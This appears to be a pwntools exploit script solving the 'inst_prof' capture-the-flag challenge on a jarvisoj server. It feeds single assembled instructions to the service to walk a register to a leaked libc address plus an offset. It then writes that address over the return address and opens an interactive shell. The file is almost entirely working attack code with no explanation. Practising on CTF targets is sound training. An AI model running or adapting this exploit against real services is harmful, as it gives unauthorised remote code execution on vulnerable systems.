from pwn import * 
context.arch='amd64' 
dec_r14=asm('dec r14')+asm('ret') 
inc_r14=asm('inc r14')+asm('ret') 
mov_r14_rsp=asm('mov r14,rsp')+asm('ret') 
mov_r14_rr14=asm('mov r14,[r14]')+asm('ret') 
mov_rrsp_r14=asm('mov [rsp],r14') 

debug=0
if debug: 
	p=process('./inst_prof') #gdb.attach(proc.pidof(p)[0]) 
	offset=0xD691F-0x202B1 
	context.log_level='debug' 
else: 
	#p = process('./inst_prof')
	p=remote('pwn2.jarvisoj.com', 9893) 
#	offset=0xEA36D-0x21F45 
	offset=0x4647C-0x21F45 
def exe(es): 
	p.send(es) 
	p.recvuntil('\x00\x00\x00') 

p.recvuntil('initializing prof...') 
p.recvuntil('ready') 
exe(mov_r14_rsp) 
for i in range(64): 
	exe(inc_r14) 
exe(mov_r14_rr14) 
t1=int(int(offset/0x1000)/2) 
t2=offset-t1*0x1000*2 
add_t1=asm('add r14,%d'%t1) 
print(t1) 
exe(add_t1) 
exe(add_t1) 
print('start inc!') 
print(t2) 
for i in range(t2): 
	exe(inc_r14) 
p.send(mov_rrsp_r14) 
p.interactive()

